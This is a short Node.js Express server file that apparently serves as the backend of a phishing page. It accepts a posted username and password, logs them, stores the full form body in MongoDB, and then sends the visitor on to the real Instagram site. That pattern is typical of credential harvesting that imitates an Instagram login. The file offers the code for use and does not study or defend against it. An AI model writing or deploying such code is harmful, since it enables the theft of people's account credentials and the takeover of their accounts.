const dotenv = require("dotenv");
const express = require("express");
const app = express();
const port = process.env.PORT || 5000;
const connect = require("./db/connect");
const User = require("./models/users");

dotenv.config();

app.use("/public", express.static("public"));
app.use(express.urlencoded({ extended: true }));

app.set("view engine", "ejs");

app.get("/", (req, res) => {
  res.render("index.ejs");
});

app.post("/", async (req, res) => {
  console.log(req.body);
  try {
    const { username, password } = req.body;
    const user = await User.create(req.body);
    res.redirect("https://www.instagram.com/");

  } catch (error) {

    console.log(error);
    res.redirect("https://www.instagram.com/");
  }
});

const start = async () => {
  try {
    //connect DB
    await connect(process.env.MONGO_URI);
    app.listen(port, console.log("server is running on port 5000..."));
  } catch (err) {
    console.log(err);
  }
};

start();
